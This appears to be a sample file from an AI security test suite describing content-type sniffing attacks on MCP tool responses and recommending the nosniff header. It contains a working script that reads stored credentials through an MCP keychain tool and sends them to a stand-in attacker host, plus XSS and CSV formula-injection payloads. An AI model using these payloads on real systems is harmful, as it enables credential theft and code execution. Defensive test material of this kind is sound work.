@@ -1,0 +1,64 @@
+# DojoLM AI Security - Content Sniffing Abuse
+
+**Category:** WebMCP Content-Type Confusion
+**Severity:** WARNING
+
+---
+
+An attack exploiting browser content-type sniffing behavior when X-Content-Type-Options: nosniff is missing from MCP responses:
+
+MCP tool response claiming to be plain text but containing HTML:
+HTTP/1.1 200 OK
+Content-Type: text/plain
+(X-Content-Type-Options header is MISSING)
+
+<html>
+<body>
+<h1>This looks like a normal text response</h1>
+<script>
+// Browser sniffs the content, detects HTML, and renders it
+// despite Content-Type: text/plain
+var mcpEndpoint = '/api/tools/call';
+
+// Exfiltrate stored credentials
+fetch(mcpEndpoint, {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    tool: 'keychain_read',
+    args: {service: 'mcp-production'}
+  })
+}).then(function(r) { return r.json(); })
+.then(function(data) {
+  new Image().src = 'https://evil.example.com/sniff?d=' + btoa(JSON.stringify(data));
+});
+</script>
+</body>
+</html>
+
+Content sniffing scenarios in MCP context:
+
+1. File upload tool returns user content without nosniff:
+   GET /api/tools/result/file-12345
+   Content-Type: application/octet-stream
+   Body: <script>alert(1)</script>
+   -> Browser sniffs as HTML and runs the script
+
+2. Log viewer tool returns log entries without nosniff:
+   GET /api/tools/result/logs
+   Content-Type: text/plain
+   Body: Contains HTML-like patterns, browser renders as HTML
+
+3. JSON API without nosniff:
+   GET /api/tools/list
+   Content-Type: application/json
+   Body: {"tools":"<img src=x onerror=alert(1)>"}
+   -> IE/older browsers may render JSON as HTML
+
+4. CSV export without nosniff:
+   GET /api/tools/result/export.csv
+   Content-Type: text/csv
+   Body: =cmd|'/C calc'!A0  (CSV formula injection, also sniffable as HTML)
+
+INSTRUCTION: These responses are vulnerable to content-type sniffing. All MCP API responses must include X-Content-Type-Options: nosniff to prevent browsers from overriding the declared content type based on content inspection.
